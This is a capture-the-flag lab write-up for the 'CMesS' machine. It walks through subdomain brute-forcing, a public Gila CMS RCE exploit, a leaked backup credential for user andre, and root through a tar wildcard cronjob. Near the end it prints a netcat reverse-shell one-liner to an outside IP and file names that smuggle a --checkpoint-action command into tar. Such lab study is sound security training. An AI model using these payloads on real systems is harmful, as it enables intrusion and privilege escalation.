---
title: "CMesS"
description: "Enum Port 80 - http first we access port 80 we only got not interesting page so we continue to directory bruteforce to find interesting page Dirsearch: we found interesting page"
lang: "en"
translationKey: "cmess"
category: "lab-writeups"
tags: ["Lab", "Sub Domain Enum", "Gila CMS", "backup file", "/opt/password.bak", "Cronjobs-tar *", "Linux", "Medium"]
publishDate: "2025-08-19"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "2545fca1-ed80-8018-8289-ebcdb30b58c8"
notionUrl: "https://app.notion.com/p/CMesS-2545fca1ed8080188289ebcdb30b58c8"
notionLastEdited: "2025-08-20T18:06:00.000Z"
---

# Enum

![](/images/cmess/bc9628f1623e.png)

## Port 80 - http

first we access port 80 we only got not interesting page so we continue to directory bruteforce to find interesting page

![](/images/cmess/7c2f722a2578.png)

Dirsearch:

![](/images/cmess/710da79d8bb1.png)

we found interesting page that was /feed and /login page which inform us to set local domain become cmess.thm on our file /etc/hosts and login Gila CMS.

![](/images/cmess/3073e8740ac2.png)

![](/images/cmess/a9e2134d44f0.png)

let’s config our file /etc/hosts, then access our target using domain (cmess.thm) then doing dirsearch again.

![](/images/cmess/6a0bd4e916b5.png)

![](/images/cmess/f6ac5867605f.png)

![](/images/cmess/a048ad9f0307.png)

after doing dirsearch we can’t got interesting page, we just got the same thing before register the domain, so we try another way. let’s we bruteforce the sub domain using ffuf 

### SubDomain Bruteforce

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm"
```

![](/images/cmess/6702e4652543.png)

after bruteforce subdomain we found that all the subdomain consist 522 words but only subdomain dev which gives us 191 words, so let’s we attach that subdomain (dev.cmess.thm) into our target IP then access it.

![](/images/cmess/8d122fb29340.png)

![](/images/cmess/718c2a55cb5a.png)

after accessing dev.cmess.thm we found something interesting those are password and a list of email that we can use to login into Gila CMS.

![](/images/cmess/a3cf4c35ccdc.png)

![](/images/cmess/bf608897921c.png)

After login we identify that Gila CMS has version 1.10.9 which has public exploit RCE 

![](/images/cmess/7207931d0fc8.png)

copy the exploit script in local system and running it.

![](/images/cmess/7346c5420131.png)

![](/images/cmess/78d307b58990.png)

![](/images/cmess/bf224fafeebd.png)

after getting revshell we can’t got user.txt cause we don’t have permission to access andre’s directory. so we need to do privesc to get andre’s user.

# Horizontal Privesc

Linpeas:

![](/images/cmess/16bc7a539f07.png)

running linpeas we didn’t got any clue, we have cronjob but be don’t have access into directory /home/andre/backup so let’s look for another way.

after looking around I found backup file credential that was so open it and we found credential of user andre

![](/images/cmess/40e7ee320684.png)

![](/images/cmess/f86e0e8d4dff.png)

login into user Andre using this credential (andre:UQfsdCB7aAP6) then voila we got user.txt

![](/images/cmess/b1f95f5d7f4c.png)

# Vertical Privesc

Linpeas:

![](/images/cmess/16bc7a539f07.png)

we found that cronjob has tar task with asteric (*) as we know it’s exploitable so let’s we exploit it by these command: Voila we got root .txt

Referensi : [https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com)

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.17.49.139 4444 >/tmp/f" > shell.sh
touch "/home/andre/backup/--checkpoint-action=exec=sh shell.sh"
touch "/home/andre/backup/--checkpoint=1"
```

![](/images/cmess/e3b20d230249.png)
